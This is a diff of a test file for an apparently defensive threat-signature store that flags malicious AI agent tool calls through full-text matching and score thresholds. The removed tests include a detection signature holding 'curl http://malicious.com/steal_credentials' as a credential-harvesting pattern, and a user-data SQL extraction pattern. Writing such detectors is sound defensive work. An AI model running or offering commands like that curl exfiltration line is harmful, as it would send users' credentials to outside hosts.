@@ -186,8 +186,7 @@ async def test_fts_partial_token_match_with_or_semantics(repo: SQLiteThreatRepos
     # AND-based matcher would require both tokens and would fail
     match = await repo.find_matching_signature(
         tool_name="run_command",
-        arguments={"command": "evil nonexistent"},
-        threshold=0.35,
+        arguments={"command": "evil nonexistent"}
     )
 
     assert match is not None
@@ -205,61 +204,3 @@ async def test_fts_partial_token_match_with_or_semantics(repo: SQLiteThreatRepos
     # For this test, we verify FTS didn't match by checking it's either None or different signature
     if match_different:
         assert match_different["signature_id"] != "sig-multitoken"
-
-
-@pytest.mark.asyncio
-async def test_fts_weak_match_quality_rejected_by_threshold(repo: SQLiteThreatRepository) -> None:
-    """Verify that weak match_quality (e.g. 0.2) is rejected by current_threshold without cancellation."""
-    sig_data = {
-        "signatureId": "sig-large-pattern",
-        "attackerIntent": "Database query extraction",
-        "payloadPattern": "SELECT id name email role created_at status FROM user_profiles WHERE tenant_id",
-        "targetTool": "db_query",
-        "mitigationAction": "BLOCK",
-        "similarityVector": None,
-    }
-    await repo.writeSignature(sig_data)
-
-    # Query with 1 matching token ('SELECT') and 4 non-matching tokens
-    # match_quality = 1 / 5 = 0.20
-    # normalized_score = 0.20 * 0.75 = 0.15
-    # current_threshold = min(0.85, 0.70) = 0.70
-    # Must be rejected (0.15 < 0.70)
-    matches = await repo.querySimilarSignatures(
-        query_text="SELECT word1 word2 word3 word4",
-        query_vector=None,
-        threshold=0.85,
-        target_tool="db_query",
-    )
-    assert len(matches) == 0
-
-
-@pytest.mark.asyncio
-async def test_fts_match_quality_scaled_by_fts_rank(repo: SQLiteThreatRepository) -> None:
-    """Verify that normalized_score scales match_quality by the SQLite fts.rank score."""
-    sig_data = {
-        "signatureId": "sig-bm25-scale",
-        "attackerIntent": "Credential harvesting via web request",
-        "payloadPattern": "curl http://malicious.com/steal_credentials",
-        "targetTool": "web_request",
-        "mitigationAction": "BLOCK",
-        "similarityVector": None,
-    }
-    await repo.writeSignature(sig_data)
-
-    matches = await repo.querySimilarSignatures(
-        query_text="curl malicious steal_credentials",
-        query_vector=None,
-        threshold=0.50,
-        fts_fallback_score=0.75,
-        fts_threshold_cap=0.70,
-        target_tool="web_request",
-    )
-
-    assert len(matches) == 1
-    # Match quality is 1.0 (3/3 query words match)
-    # Score must be scaled by fts_score and capped by fts_threshold_cap (0.70)
-    assert matches[0]["similarity_score"] > 0.0
-    assert matches[0]["similarity_score"] <= 0.70
-
-
